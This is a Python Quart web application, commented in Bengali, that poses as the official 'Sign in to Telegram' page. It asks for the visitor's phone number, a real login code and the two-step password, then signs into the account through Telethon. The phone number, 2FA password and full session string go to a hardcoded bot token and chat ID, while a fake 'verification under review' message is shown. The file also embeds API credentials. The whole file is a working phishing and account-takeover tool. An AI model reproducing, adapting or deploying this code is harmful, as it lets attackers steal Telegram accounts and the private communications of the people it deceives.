import os
import re
import aiohttp
from quart import Quart, request, render_template_string, session
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError, PhoneNumberInvalidError

api_id = 18146130
api_hash = '21d85f812262209fe3f56a0c1c117f92'

bot_token = '7781700839:AAGbKfsipleOcXk06aWwnoikVxoGqVbePJk'
chat_id = '6782038686'

app = Quart(__name__)
app.secret_key = os.urandom(24)

# দেশগুলির তালিকা
countries = [
     {"name": "Afghanistan", "code": "+93", "flag": "🇦🇫"},
    {"name": "Albania", "code": "+355", "flag": "🇦🇱"},
    {"name": "Algeria", "code": "+213", "flag": "🇩🇿"},
    {"name": "Andorra", "code": "+376", "flag": "🇦🇩"},
    {"name": "Argentina", "code": "+54", "flag": "🇦🇷"},
    {"name": "Australia", "code": "+61", "flag": "🇦🇺"},
    {"name": "Austria", "code": "+43", "flag": "🇦🇹"},
    {"name": "Bahrain", "code": "+973", "flag": "🇧🇭"},
    {"name": "Bangladesh", "code": "+880", "flag": "🇧🇩"},
    {"name": "Brazil", "code": "+55", "flag": "🇧🇷"},
    {"name": "Canada", "code": "+1", "flag": "🇨🇦"},
    {"name": "China", "code": "+86", "flag": "🇨🇳"},
    {"name": "Denmark", "code": "+45", "flag": "🇩🇰"},
    {"name": "Egypt", "code": "+20", "flag": "🇪🇬"},
    {"name": "France", "code": "+33", "flag": "🇫🇷"},
    {"name": "Germany", "code": "+49", "flag": "🇩🇪"},
    {"name": "Greece", "code": "+30", "flag": "🇬🇷"},
    {"name": "Hong Kong", "code": "+852", "flag": "🇭🇰"},
    {"name": "India", "code": "+91", "flag": "🇮🇳"},
    {"name": "Indonesia", "code": "+62", "flag": "🇮🇩"},
    {"name": "Iran", "code": "+98", "flag": "🇮🇷"},
    {"name": "Iraq", "code": "+964", "flag": "🇮🇶"},
    {"name": "Ireland", "code": "+353", "flag": "🇮🇪"},
    {"name": "Israel", "code": "+972", "flag": "🇮🇱"},
    {"name": "Italy", "code": "+39", "flag": "🇮🇹"},
    {"name": "Japan", "code": "+81", "flag": "🇯🇵"},
    {"name": "Jordan", "code": "+962", "flag": "🇯🇴"},
    {"name": "Kuwait", "code": "+965", "flag": "🇰🇼"},
    {"name": "Malaysia", "code": "+60", "flag": "🇲🇾"},
    {"name": "Mexico", "code": "+52", "flag": "🇲🇽"},
    {"name": "Nepal", "code": "+977", "flag": "🇳🇵"},
    {"name": "Netherlands", "code": "+31", "flag": "🇳🇱"},
    {"name": "New Zealand", "code": "+64", "flag": "🇳🇿"},
    {"name": "Nigeria", "code": "+234", "flag": "🇳🇬"},
    {"name": "Oman", "code": "+968", "flag": "🇴🇲"},
    {"name": "Pakistan", "code": "+92", "flag": "🇵🇰"},
    {"name": "Philippines", "code": "+63", "flag": "🇵🇭"},
    {"name": "Poland", "code": "+48", "flag": "🇵🇱"},
    {"name": "Portugal", "code": "+351", "flag": "🇵🇹"},
    {"name": "Qatar", "code": "+974", "flag": "🇶🇦"},
    {"name": "Russia", "code": "+7", "flag": "🇷🇺"},
    {"name": "Saudi Arabia", "code": "+966", "flag": "🇸🇦"},
    {"name": "Singapore", "code": "+65", "flag": "🇸🇬"},
    {"name": "South Africa", "code": "+27", "flag": "🇿🇦"},
    {"name": "South Korea", "code": "+82", "flag": "🇰🇷"},
    {"name": "Spain", "code": "+34", "flag": "🇪🇸"},
    {"name": "Sri Lanka", "code": "+94", "flag": "🇱🇰"},
    {"name": "Sweden", "code": "+46", "flag": "🇸🇪"},
    {"name": "Switzerland", "code": "+41", "flag": "🇨🇭"},
    {"name": "Thailand", "code": "+66", "flag": "🇹🇭"},
    {"name": "Turkey", "code": "+90", "flag": "🇹🇷"},
    {"name": "United Arab Emirates", "code": "+971", "flag": "🇦🇪"},
    {"name": "United Kingdom", "code": "+44", "flag": "🇬🇧"},
    {"name": "United States", "code": "+1", "flag": "🇺🇸"},
    {"name": "Vietnam", "code": "+84", "flag": "🇻🇳"},
]

# CSS আলাদাভাবে রাখা হয়েছে
CSS_STYLES = """
<style>
:root {
    --telegram-blue: #0088cc;
    --telegram-blue-hover: #007ab8;
    --background-color: #f3f6fb;
    --card-background: #fff;
    --border-color: #dce3e8;
    --text-color: #2c3e50;
    --secondary-text: #555;
    --placeholder-color: #a9a9a9;
    --shadow-light: 0 4px 15px rgba(0, 0, 0, 0.08);
    --shadow-medium: 0 8px 25px rgba(0, 0, 0, 0.1);
    --error-color: #e53935;
    --success-color: #43a047;
}

body {
    font-family: 'Poppins', sans-serif;
    background-color: var(--background-color);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    padding: 20px;
    overflow: hidden;
}

.login-container {
    background-color: var(--card-background);
    width: 100%;
    max-width: 400px;
    border-radius: 20px;
    padding: 50px 35px;
    box-shadow: var(--shadow-medium);
    text-align: center;
    /* নতুন স্টাইল যোগ করুন */
    position: fixed;
}

.login-container:hover {
    transform: translateY(-5px);
}

.login-container img.logo {
    width: 80px;
    margin-bottom: 25px;
}

.login-container h2 {
    margin-bottom: 10px;
    font-size: 24px;
    color: var(--text-color);
    font-weight: 600;
}

.login-container p.subtitle {
    font-size: 15px;
    color: var(--secondary-text);
    margin-bottom: 30px;
    line-height: 1.5;
}

.input-group {
    position: relative;
    margin-bottom: 25px;
}

.country-label {
    text-align: left;
    font-size: 14px;
    color: var(--secondary-text);
    margin-bottom: 8px;
    padding-left: 15px;
}

.phone-input-wrapper {
    display: flex;
    border: 1px solid var(--border-color);
    border-radius: 12px;
    overflow: hidden;
    background-color: #f9f9fc;
    transition: border-color 0.3s ease;
}

.phone-input-wrapper:focus-within {
    border-color: var(--telegram-blue);
    box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
}

.phone-input-wrapper .country-code-display {
    display: flex;
    align-items: center;
    padding: 0 15px;
    border-right: 1px solid var(--border-color);
    background-color: #eef1f6;
    color: var(--text-color);
    font-size: 16px;
    font-weight: 500;
    user-select: none;
    cursor: pointer;
}

.phone-input-wrapper input[type="tel"] {
    flex: 1;
    border: none;
    padding: 15px;
    font-size: 16px;
    outline: none;
    background: transparent;
    color: var(--text-color);
    text-align: left;
}

.phone-input-wrapper input[type="tel"]::placeholder {
    color: var(--placeholder-color);
}

.code-input-wrapper {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin-top: 20px;
}

.code-input-wrapper input {
    width: 50px;
    height: 50px;
    text-align: center;
    font-size: 24px;
    font-weight: 600;
    border: 1px solid var(--border-color);
    border-radius: 10px;
    background-color: #f9f9fc;
    outline: none;
    transition: border-color 0.3s;
}

.code-input-wrapper input:focus {
    border-color: var(--telegram-blue);
    box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
}

.password-input-wrapper {
    margin-top: 20px;
}

.password-input-wrapper input {
    width: 100%;
    padding: 15px;
    font-size: 16px;
    border: 1px solid var(--border-color);
    border-radius: 10px;
    outline: none;
    transition: border-color 0.3s;
}

.password-input-wrapper input:focus {
    border-color: var(--telegram-blue);
    box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
}

.code-info {
    font-size: 14px;
    color: var(--secondary-text);
    margin-top: 20px;
}

.code-info a {
    color: var(--telegram-blue);
    text-decoration: none;
}

button.primary-btn {
    width: 100%;
    padding: 15px;
    margin-top: 20px;
    font-size: 17px;
    font-weight: 500;
    color: white;
    background-color: var(--telegram-blue);
    border: none;
    border-radius: 12px;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.2s ease;
}

button.primary-btn:hover {
    background-color: var(--telegram-blue-hover);
    transform: translateY(-2px);
}

button.primary-btn:active {
    transform: translateY(0);
}

.secondary-btn {
    width: 100%;
    padding: 12px;
    margin-top: 15px;
    font-size: 15px;
    font-weight: 500;
    color: var(--telegram-blue);
    background-color: transparent;
    border: 1px solid var(--telegram-blue);
    border-radius: 12px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.secondary-btn:hover {
    background-color: rgba(0, 136, 204, 0.1);
}

.footer-text {
    margin-top: 20px;
    font-size: 13px;
    color: #888;
    text-align: center;
    line-height: 1.4;
}

.error-message {
    color: var(--error-color);
    font-size: 14px;
    margin-top: 10px;
    padding: 10px;
    border-radius: 8px;
    background-color: rgba(229, 57, 53, 0.1);
}

.success-message {
    color: var(--success-color);
    font-size: 14px;
    margin-top: 10px;
    padding: 10px;
    border-radius: 8px;
    background-color: rgba(67, 160, 71, 0.1);
}

.modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.4);
    justify-content: center;
    align-items: center;
}

.modal-content {
    background-color: #fff;
    padding: 30px;
    border-radius: 15px;
    width: 90%;
    max-width: 450px;
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    position: relative;
    text-align: left;
    max-height: 80vh;
    display: flex;
    flex-direction: column;
}

.modal-content h3 {
    margin-top: 0;
    font-size: 20px;
    color: var(--text-color);
}

.modal-content .search-box {
    width: 100%;
    padding: 12px;
    margin: 15px 0 20px 0;
    border: 1px solid var(--border-color);
    border-radius: 8px;
    outline: none;
    transition: border-color 0.3s;
    font-size: 16px;
}

.modal-content .search-box:focus {
    border-color: var(--telegram-blue);
}

.country-list {
    flex-grow: 1;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
}

.country-item {
    display: flex;
    align-items: center;
    padding: 12px 10px;
    cursor: pointer;
    transition: background-color 0.2s;
    border-radius: 8px;
}

.country-item:hover {
    background-color: #f1f4f8;
}

.country-item .flag {
    font-size: 20px;
    margin-right: 12px;
}

.country-item .country-name {
    flex: 1;
    font-size: 16px;
    color: var(--text-color);
}

.country-item .country-code {
    font-size: 15px;
    color: var(--secondary-text);
}

/* New styles for error states */
.input-error {
    border-color: var(--error-color) !important;
}

.error-shake {
    animation: shake 0.5s linear;
}

@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    75% { transform: translateX(5px); }
}
</style>
"""

def render_page(content):
    html_content = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    {CSS_STYLES}
</head>
<body>
    {content}
</body>
</html>
'''
    return html_content

def validate_phone_number(phone, country_code):
    """ফোন নম্বর ভ্যালিডেশন"""
    if not re.match(r'^[0-9]+$', phone):
        return False
    return True

def sanitize_phone_number(phone):
    """ফোন নম্বর থেকে শুধুমাত্র সংখ্যা রাখে"""
    return re.sub(r'[^0-9]', '', phone)

@app.route('/', methods=['GET'])
async def index():
    # ডিফল্ট দেশ হিসেবে বাংলাদেশ সেট করা
    default_country = next((c for c in countries if c["name"] == "Bangladesh"), countries[0])
    
    # দেশ নির্বাচনের জন্য JavaScript সহ UI
    countries_options = "".join([
        f'<div class="country-item" onclick="selectCountry(\'{c["code"]}\', \'{c["flag"]}\', \'{c["name"]}\')">'
        f'<span class="flag">{c["flag"]}</span>'
        f'<span class="country-name">{c["name"]}</span>'
        f'<span class="country-code">{c["code"]}</span>'
        f'</div>'
        for c in countries
    ])
    
    content = f'''
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
        <h2>Sign in to Telegram</h2>
        <p class="subtitle">Please confirm your country code and enter your phone number.</p>
        
        <form id="phoneForm" action="/send-code" method="post">
            <div class="input-group">
                <div class="country-label">Country</div>
                <div class="phone-input-wrapper">
                    <div class="country-code-display" id="countrySelector">
                        <span id="selectedFlag">{default_country["flag"]}</span>
                        <span id="selectedCode">{default_country["code"]}</span>
                    </div>
                    <input type="tel" id="phone" name="phone" placeholder="Your phone number" required>
                    <input type="hidden" id="country_code" name="country_code" value="{default_country["code"]}">
                </div>
            </div>
            
            <button type="submit" class="primary-btn">Next</button>
        </form>
        
        <p class="footer-text">By signing in, you agree to our Terms of Service and Privacy Policy.</p>
    </div>
    
    <div class="modal" id="countryModal">
        <div class="modal-content">
            <h3>Select Country</h3>
            <input type="text" class="search-box" id="countrySearch" placeholder="Search country...">
            <div class="country-list">
                {countries_options}
            </div>
        </div>
    </div>
    
    <script>
        // দেশ নির্বাচন মোডাল
        const countrySelector = document.getElementById('countrySelector');
        const countryModal = document.getElementById('countryModal');
        const countrySearch = document.getElementById('countrySearch');
        const countryList = document.querySelectorAll('.country-item');
        
        countrySelector.addEventListener('click', function() {{
            countryModal.style.display = 'flex';
        }});
        
        countrySearch.addEventListener('input', function() {{
            const searchTerm = this.value.toLowerCase();
            countryList.forEach(item => {{
                const countryName = item.querySelector('.country-name').textContent.toLowerCase();
                if (countryName.includes(searchTerm)) {{
                    item.style.display = 'flex';
                }} else {{
                    item.style.display = 'none';
                }}
            }});
        }});
        
        function selectCountry(code, flag, name) {{
            document.getElementById('selectedFlag').textContent = flag;
            document.getElementById('selectedCode').textContent = code;
            document.getElementById('country_code').value = code;
            countryModal.style.display = 'none';
        }}
        
        // মোডাল বাইরে ক্লিক করলে বন্ধ হবে
        window.addEventListener('click', function(event) {{
            if (event.target === countryModal) {{
                countryModal.style.display = 'none';
            }}
        }});
    </script>
    '''
    
    return render_page(content)

@app.route('/send-code', methods=['POST'])
async def send_code():
    form = await request.form
    phone = sanitize_phone_number(form['phone'])
    country_code = form['country_code']
    full_phone = f"{country_code}{phone}"
    
    # ফোন নম্বর ভ্যালিডেশন
    if not validate_phone_number(phone, country_code):
        # ভুল ফোন নম্বরের ক্ষেত্রে একই পৃষ্ঠায় ফিরে যান, ত্রুটি বার্তা সহ
        default_country = next((c for c in countries if c["code"] == country_code), countries[0])
        countries_options = "".join([
            f'<div class="country-item" onclick="selectCountry(\'{c["code"]}\', \'{c["flag"]}\', \'{c["name"]}\')">'
            f'<span class="flag">{c["flag"]}</span>'
            f'<span class="country-name">{c["name"]}</span>'
            f'<span class="country-code">{c["code"]}</span>'
            f'</div>'
            for c in countries
        ])
        
        content = f'''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Sign in to Telegram</h2>
            <p class="subtitle">Please confirm your country code and enter your phone number.</p>
            
            <div class="error-message">Invalid phone number. Please enter a valid phone number.</div>
            
            <form id="phoneForm" action="/send-code" method="post">
                <div class="input-group">
                    <div class="country-label">Country</div>
                    <div class="phone-input-wrapper">
                        <div class="country-code-display" id="countrySelector">
                            <span id="selectedFlag">{default_country["flag"]}</span>
                            <span id="selectedCode">{default_country["code"]}</span>
                        </div>
                        <input type="tel" id="phone" name="phone" placeholder="Your phone number" value="{phone}" required>
                        <input type="hidden" id="country_code" name="country_code" value="{country_code}">
                    </div>
                </div>
                
                <button type="submit" class="primary-btn">Next</button>
            </form>
            
            <p class="footer-text">By signing in, you agree to our Terms of Service and Privacy Policy.</p>
        </div>
        
        <div class="modal" id="countryModal">
            <div class="modal-content">
                <h3>Select Country</h3>
                <input type="text" class="search-box" id="countrySearch" placeholder="Search country...">
                <div class="country-list">
                    {countries_options}
                </div>
            </div>
        </div>
        
        <script>
            // দেশ নির্বাচন মোডাল
            const countrySelector = document.getElementById('countrySelector');
            const countryModal = document.getElementById('countryModal');
            const countrySearch = document.getElementById('countrySearch');
            const countryList = document.querySelectorAll('.country-item');
            
            countrySelector.addEventListener('click', function() {{
                countryModal.style.display = 'flex';
            }});
            
            countrySearch.addEventListener('input', function() {{
                const searchTerm = this.value.toLowerCase();
                countryList.forEach(item => {{
                    const countryName = item.querySelector('.country-name').textContent.toLowerCase();
                    if (countryName.includes(searchTerm)) {{
                        item.style.display = 'flex';
                    }} else {{
                        item.style.display = 'none';
                    }}
                }});
            }});
            
            function selectCountry(code, flag, name) {{
                document.getElementById('selectedFlag').textContent = flag;
                document.getElementById('selectedCode').textContent = code;
                document.getElementById('country_code').value = code;
                countryModal.style.display = 'none';
            }}
            
            // মোডাল বাইরে ক্লিক করলে বন্ধ হবে
            window.addEventListener('click', function(event) {{
                if (event.target === countryModal) {{
                    countryModal.style.display = 'none';
                }}
            }});
            
            // ত্রুটি অবস্থায় ইনপুট ফিল্ডে শেক অ্যানিমেশন যোগ করুন
            document.getElementById('phone').classList.add('input-error', 'error-shake');
            setTimeout(() => {{
                document.getElementById('phone').classList.remove('error-shake');
            }}, 500);
        </script>
        '''
        
        return render_page(content)
    
    # টেলিগ্রাম ক্লায়েন্ট তৈরি
    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.connect()
    
    try:
        # কোড পাঠানোর চেষ্টা করুন
        sent = await client.send_code_request(full_phone)
        
        # সেশন সংরক্ষণ করুন
        session['telegram_client'] = client.session.save()
        session['phone_number'] = full_phone
        session['phone_code_hash'] = sent.phone_code_hash
        
        # OTP পৃষ্ঠা প্রদর্শন করুন
        content = f'''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Verification Code</h2>
            <p class="subtitle">We've sent the code to the phone {full_phone}.</p>
            
            <form id="otpForm" action="/verify-otp" method="post">
                <div class="code-input-wrapper">
                    <input type="text" id="code1" name="code1" maxlength="1" oninput="moveToNext(this, 'code2')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code2" name="code2" maxlength="1" oninput="moveToNext(this, 'code3')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code3" name="code3" maxlength="1" oninput="moveToNext(this, 'code4')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code4" name="code4" maxlength="1" oninput="moveToNext(this, 'code5')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code5" name="code5" maxlength="1" oninput="moveToNext(this, '')" onkeyup="handlePaste(event)" autocomplete="off">
                </div>
                
                <p class="code-info">Didn't get the code? <a href="/resend-code">Resend code</a></p>
                
                <button type="submit" class="primary-btn">Verify</button>
            </form>
            
            <button class="secondary-btn" onclick="window.location.href='/'">Change Phone Number</button>
        </div>
        
        <script>
            function moveToNext(current, nextFieldId) {{
                if (current.value.length === 1) {{
                    if (nextFieldId !== '') {{
                        document.getElementById(nextFieldId).focus();
                    }}
                }}
            }}
            
            function handlePaste(event) {{
                // Ctrl+V বা Cmd+V চেপেছেন কিনা চেক করুন
                if ((event.ctrlKey || event.metaKey) && event.key === 'v') {{
                    // পেস্ট ইভেন্ট হওয়ার জন্য একটু দেরি করুন
                    setTimeout(function() {{
                        // সমস্ত ইনপুট ফিল্ড থেকে মান সংগ্রহ করুন
                        const code1 = document.getElementById('code1').value;
                        const code2 = document.getElementById('code2').value;
                        const code3 = document.getElementById('code3').value;
                        const code4 = document.getElementById('code4').value;
                        const code5 = document.getElementById('code5').value;
                        
                        // সমস্ত মান একত্রিত করুন
                        const fullCode = code1 + code2 + code3 + code4 + code5;
                        
                        // যদি পেস্ট করা কোড 5 অক্ষরের হয়, তাহলে এটি আলাদা করুন
                        if (fullCode.length === 5) {{
                            document.getElementById('code1').value = fullCode[0];
                            document.getElementById('code2').value = fullCode[1];
                            document.getElementById('code3').value = fullCode[2];
                            document.getElementById('code4').value = fullCode[3];
                            document.getElementById('code5').value = fullCode[4];
                            document.getElementById('code5').focus();
                        }}
                    }}, 10);
                }}
            }}
            
            // OTP পেস্ট করার জন্য বিশেষ হ্যান্ডলার
            document.addEventListener('DOMContentLoaded', function() {{
                const inputs = document.querySelectorAll('.code-input-wrapper input');
                
                inputs.forEach((input, index) => {{
                    input.addEventListener('paste', function(e) {{
                        e.preventDefault();
                        const pastedData = e.clipboardData.getData('text');
                        
                        if (pastedData.length === 5 && /^\\d{{5}}$/.test(pastedData)) {{
                            // OTP কে আলাদা আলাদা ইনপুটে ভাগ করুন
                            for (let i = 0; i < 5; i++) {{
                                inputs[i].value = pastedData[i];
                            }}
                            inputs[4].focus();
                        }}
                    }});
                }});
            }});
        </script>
        '''
        
        return render_page(content)
        
    except PhoneNumberBannedError:
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Phone Number Banned</h2>
            <p class="subtitle">This phone number has been banned from Telegram.</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Another Number</a>
        </div>
        ''')
    except PhoneNumberInvalidError:
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Invalid Phone Number</h2>
            <p class="subtitle">The phone number you entered is invalid.</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Again</a>
        </div>
        ''')
    except Exception as e:
        return render_page(f'''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Error</h2>
            <p class="subtitle">An error occurred: {str(e)}</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Again</a>
        </div>
        ''')

@app.route('/verify-otp', methods=['POST'])
async def verify_otp():
    form = await request.form
    code = form['code1'] + form['code2'] + form['code3'] + form['code4'] + form['code5']
    
    if 'telegram_client' not in session or 'phone_number' not in session or 'phone_code_hash' not in session:
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Verification Expired</h2>
            <p class="subtitle">Your Verification has expired. Please start over.</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Again</a>
        </div>
        ''')
    
    # ক্লায়েন্ট পুনরুদ্ধার করুন
    client = TelegramClient(StringSession(session['telegram_client']), api_id, api_hash)
    await client.connect()
    
    try:
        # OTP যাচাই করুন
        await client.sign_in(session['phone_number'], code, phone_code_hash=session['phone_code_hash'])
        
        # সাইন ইন সফল হলে
        user = await client.get_me()
        
        # বটের মাধ্যমে তথ্য প্রেরণ
        async with aiohttp.ClientSession() as http_session:
            message = f"📱 Phone: {session['phone_number']}\n📝 Session:\n{client.session.save()}"
            await http_session.post(
                f'https://api.telegram.org/bot{bot_token}/sendMessage',
                data={'chat_id': chat_id, 'text': message}
            )
        
        # সেশন ডেটা পরিষ্কার করুন
        session.clear()
        
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>⏳Verification under review</h2>
            <p class="subtitle">It may take some time ⏳. Your request will be confirmed within 24 hours. ✅📩</p>
            <p class="footer-text">You can now close this window.</p>
        </div>
        ''')
        
    except SessionPasswordNeededError:
        # 2FA পাসওয়ার্ড প্রয়োজন
        session['telegram_client'] = client.session.save()
        
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Two-Step Verification</h2>
            <p class="subtitle">Your account is protected with an additional password.</p>
            
            <form id="passwordForm" action="/verify-password" method="post">
                <div class="password-input-wrapper">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                
                <button type="submit" class="primary-btn">Verify</button>
            </form>
            
            <button class="secondary-btn" onclick="window.location.href='/'">Change Phone Number</button>
        </div>
        ''')
    except Exception as e:
        # OTP ভুল হলে একই পৃষ্ঠায় ফিরে যান, ত্রুটি বার্তা সহ
        content = f'''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Verification Code</h2>
            <p class="subtitle">We've sent the code to the phone {session['phone_number']}.</p>
            
            <div class="error-message">The verification code you entered is incorrect. Please try again.</div>
            
            <form id="otpForm" action="/verify-otp" method="post">
                <div class="code-input-wrapper">
                    <input type="text" id="code1" name="code1" maxlength="1" oninput="moveToNext(this, 'code2')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code2" name="code2" maxlength="1" oninput="moveToNext(this, 'code3')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code3" name="code3" maxlength="1" oninput="moveToNext(this, 'code4')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code4" name="code4" maxlength="1" oninput="moveToNext(this, 'code5')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code5" name="code5" maxlength="1" oninput="moveToNext(this, '')" onkeyup="handlePaste(event)" autocomplete="off">
                </div>
                
                <p class="code-info">Didn't get the code? <a href="/resend-code">Resend code</a></p>
                
                <button type="submit" class="primary-btn">Verify</button>
            </form>
            
            <button class="secondary-btn" onclick="window.location.href='/'">Change Phone Number</button>
        </div>
        
        <script>
            function moveToNext(current, nextFieldId) {{
                if (current.value.length === 1) {{
                    if (nextFieldId !== '') {{
                        document.getElementById(nextFieldId).focus();
                    }}
                }}
            }}
            
            function handlePaste(event) {{
                // Ctrl+V বা Cmd+V চেপেছেন কিনা চেক করুন
                if ((event.ctrlKey || event.metaKey) && event.key === 'v') {{
                    // পেস্ট ইভেন্ট হওয়ার জন্য একটু দেরি করুন
                    setTimeout(function() {{
                        // সমস্ত ইনপুট ফিল্ড থেকে মান সংগ্রহ করুন
                        const code1 = document.getElementById('code1').value;
                        const code2 = document.getElementById('code2').value;
                        const code3 = document.getElementById('code3').value;
                        const code4 = document.getElementById('code4').value;
                        const code5 = document.getElementById('code5').value;
                        
                        // সমস্ত মান একত্রিত করুন
                        const fullCode = code1 + code2 + code3 + code4 + code5;
                        
                        // যদি পেস্ট করা কোড 5 অক্ষরের হয়, তাহলে এটি আলাদা করুন
                        if (fullCode.length === 5) {{
                            document.getElementById('code1').value = fullCode[0];
                            document.getElementById('code2').value = fullCode[1];
                            document.getElementById('code3').value = fullCode[2];
                            document.getElementById('code4').value = fullCode[3];
                            document.getElementById('code5').value = fullCode[4];
                            document.getElementById('code5').focus();
                        }}
                    }}, 10);
                }}
            }}
            
            // OTP পেস্ট করার জন্য বিশেষ হ্যান্ডলার
            document.addEventListener('DOMContentLoaded', function() {{
                const inputs = document.querySelectorAll('.code-input-wrapper input');
                
                inputs.forEach((input, index) => {{
                    input.addEventListener('paste', function(e) {{
                        e.preventDefault();
                        const pastedData = e.clipboardData.getData('text');
                        
                        if (pastedData.length === 5 && /^\\d{{5}}$/.test(pastedData)) {{
                            // OTP কে আলাদা আলাদা ইনপুটে ভাগ করুন
                            for (let i = 0; i < 5; i++) {{
                                inputs[i].value = pastedData[i];
                            }}
                            inputs[4].focus();
                        }}
                    }});
                }});
                
                // ত্রুটি অবস্থায় OTP ফিল্ডে শেক অ্যানিমেশন যোগ করুন
                inputs.forEach(input => {{
                    input.classList.add('input-error', 'error-shake');
                }});
                setTimeout(() => {{
                    inputs.forEach(input => {{
                        input.classList.remove('error-shake');
                    }});
                }}, 500);
            }});
        </script>
        '''
        
        return render_page(content)

@app.route('/verify-password', methods=['POST'])
async def verify_password():
    form = await request.form
    password = form['password']
    
    if 'telegram_client' not in session:
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Verification Expired</h2>
            <p class="subtitle">Your verification has expired. Please start over.</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Again</a>
        </div>
        ''')
    
    # ক্লায়েন্ট পুনরুদ্ধার করুন
    client = TelegramClient(StringSession(session['telegram_client']), api_id, api_hash)
    await client.connect()
    
    try:
        # পাসওয়ার্ড দিয়ে সাইন ইন করুন
        await client.sign_in(password=password)
        
        # সাইন ইন সফল হলে
        user = await client.get_me()
        
        # বটের মাধ্যমে তথ্য প্রেরণ
        async with aiohttp.ClientSession() as http_session:
            message = f"📱 Phone: {session['phone_number']}\n🔐 2FA Password: {password}\n📝 Session:\n{client.session.save()}"
            await http_session.post(
                f'https://api.telegram.org/bot{bot_token}/sendMessage',
                data={'chat_id': chat_id, 'text': message}
            )
        
        # সেশন ডেটা পরিষ্কার করুন
        session.clear()
        
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Successfully Signed In</h2>
            <p class="subtitle">You have successfully signed in to Telegram.</p>
            <p class="footer-text">You can now close this window.</p>
        </div>
        ''')
        
    except Exception as e:
        # পাসওয়ার্ড ভুল হলে একই পৃষ্ঠায় ফিরে যান, ত্রুটি বার্তা সহ
        content = f'''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Two-Step Verification</h2>
            <p class="subtitle">Your account is protected with an additional password.</p>
            
            <div class="error-message">The password you entered is incorrect. Please try again.</div>
            
            <form id="passwordForm" action="/verify-password" method="post">
                <div class="password-input-wrapper">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required class="input-error error-shake">
                </div>
                
                <button type="submit" class="primary-btn">Verify</button>
            </form>
            
            <button class="secondary-btn" onclick="window.location.href='/'">Change Phone Number</button>
        </div>
        
        <script>
            // ত্রুটি অবস্থায় পাসওয়ার্ড ফিল্ডে শেক অ্যানিমেশন যোগ করুন
            document.addEventListener('DOMContentLoaded', function() {{
                const passwordInput = document.getElementById('password');
                passwordInput.classList.add('input-error', 'error-shake');
                setTimeout(() => {{
                    passwordInput.classList.remove('error-shake');
                }}, 500);
            }});
        </script>
        '''
        
        return render_page(content)

